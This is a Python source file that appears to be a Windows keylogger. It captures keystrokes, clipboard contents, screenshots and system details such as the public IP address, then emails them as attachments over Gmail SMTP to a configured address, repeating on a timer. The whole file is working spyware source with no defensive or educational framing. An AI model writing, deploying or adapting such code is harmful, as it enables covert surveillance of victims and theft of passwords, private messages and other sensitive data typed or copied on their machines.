from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time





from requests import get


from PIL import ImageGrab

keysInfo = "keyLog.txt"
systemInfo = "systemInfo.txt"
clipboardInfo = "clipboardInfo.txt"
screenshotInfo = "screenshot.png"
emailAddr = ""
password = ""

time_iteration = 15
number_of_iterations_end = 3

toAddr = ""

filePath = ""
extend = "\\"


def send_email(filename, attachment, toaddr):
    fromAddr = emailAddr
    msg = MIMEMultipart()
    msg['From'] = fromAddr
    msg['To'] = toAddr
    msg['Subject'] = "Log File"
    body = "bodyOfEmail"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())

    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromAddr, password)
    text = msg.as_string()
    s.sendmail(fromAddr, toAddr, text)
    s.quit()


send_email(keysInfo, filePath + extend + keysInfo, toAddr)


def computer_information():
    with open(filePath + extend + systemInfo, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            publicIP = get("https://api.ipify.org").text
            f.write("Public IP Address: " + publicIP + '\n')

        except Exception:
            f.write("Couldn't locate Public IP Address likely reached max query" + '\n')

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')


def copy_clipboard():
    with open(filePath + extend + clipboardInfo, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pastedData = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pastedData)

        except:
            f.write("Could not copy clipboard")


copy_clipboard()


def screenshot():
    im = ImageGrab.grab()
    im.save(filePath + extend + screenshotInfo)


screenshot()

computer_information()

count = 0
keys = []

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:
    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(filePath + extend + keysInfo, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(filePath + extend + keysInfo, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshotInfo, filePath + extend + screenshotInfo, toAddr)
        copy_clipboard()
        number_of_iterations += 1
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration
